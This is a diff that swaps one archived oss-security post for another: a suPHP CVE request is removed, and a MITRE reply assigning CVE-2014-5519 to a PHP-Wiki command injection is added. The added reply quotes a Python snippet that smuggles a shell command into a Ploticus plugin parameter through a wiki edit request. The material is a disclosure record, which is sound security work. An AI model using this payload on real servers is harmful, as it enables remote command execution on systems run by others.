@@ -1,36 +1,37 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/01/29/4
-Message-ID: <20140129063017.GA9779@lorien.valinor.li>
-Date: Wed, 29 Jan 2014 07:30:17 +0100
-From: Salvatore Bonaccorso <carnil@...ian.org>
-To: OSS Security Mailinglist <oss-security@...ts.openwall.com>
-Cc: 736969@...s.debian.org
-Subject: (possible) CVE request: suPHP 0.7.2 release fixed a possible arbitrary code execution
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/08/29/2
+Message-Id: <20140829090818.1BA4D6C0001@smtpvmsrv1.mitre.org>
+Date: Fri, 29 Aug 2014 05:08:18 -0400 (EDT)
+From: cve-assign@...re.org
+To: bch@...h.ai
+Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
+Subject: Re: PHP-Wiki Command Injection
 Content-Type: text/plain; charset=utf-8
 
-Hi
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-I do not have a commit reference for this: suPHP 0.7.2 release fixed a
-security ssue that was introduced with the 0.7.0 release. From
-Upstream[1]:
+> data = urllib.urlencode([('pagename','HeIp'),('edit[content]',
+>       '<<Ploticus device=";echo 123\':::\' 1>&2;'+cmd+' 1>&2;echo \':::\'123 1>&2;"
+>        -prefab= -csmap= data= alt= help= >>'),
+>        ('edit[preview]','Preview'),('action','edit')])
+> cmd1 = urllib2.Request(domain +'/index.php/HeIp',data)
 
-----cut---------cut---------cut---------cut---------cut---------cut-----
-suPHP 0.7.2 has been released.
-This release fixes a security issue that was introduced with the 0.7.0
-release. This issue affected the source-highlighting feature and could
-only be exploited, if the suPHP_PHPPath option was set. In this case
-local users which could create or edit .htaccess files could possibly
-execute arbitrary code with the privileges of the user the webserver
-was running as.
-----cut---------cut---------cut---------cut---------cut---------cut-----
+Use CVE-2014-5519.
 
-Does this have already a CVE and/or should one be assigned?
+- -- 
+CVE assignment team, MITRE CVE Numbering Authority
+M/S M300
+202 Burlington Road, Bedford, MA 01730 USA
+[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.14 (SunOS)
 
-suPHP is furthermore not anymore maintained upstream, see [3].
-
- [1] http://www.suphp.org/Home.html
- [2] http://bugs.debian.org/736969
- [3] https://lists.marsching.com/pipermail/suphp/2013-May/002554.html
-
-Regards,
-Salvatore
+iQEcBAEBAgAGBQJUAEHwAAoJEKllVAevmvmsETYH/RAUb7JXuixfCbDFM7/ZgRrr
+1P92G3AWIkp91RDWOQuDMy4EFqWVDiRL0Ti2SPr/77YVHjpgens8F08Y91CD5fz1
+wXkNZSAyIZ1l8SVpbEYgu3ZIy/tNSTKYWmiF4u7udtWazLWdBg0hY+ukZsGzeWJJ
+KSCnFrFlxeJbgx2MRXE2QnDoQTeDkpZ/1y6lA5M2mpu+kKgAgM53WyfQD9ZeeOTx
+8NGdEYTPtYwtzgWSqtkvuon+P1W8mTYp8e623m2PpUolsZQ0CQ/oLcX0Cbtya6y9
+4AGxiA6z7l4624et7ltQDih/pGMDl33c0h/896ddZqS/M4pDDvI+EW/px1yKnaI=
+=TuwP
+-----END PGP SIGNATURE-----
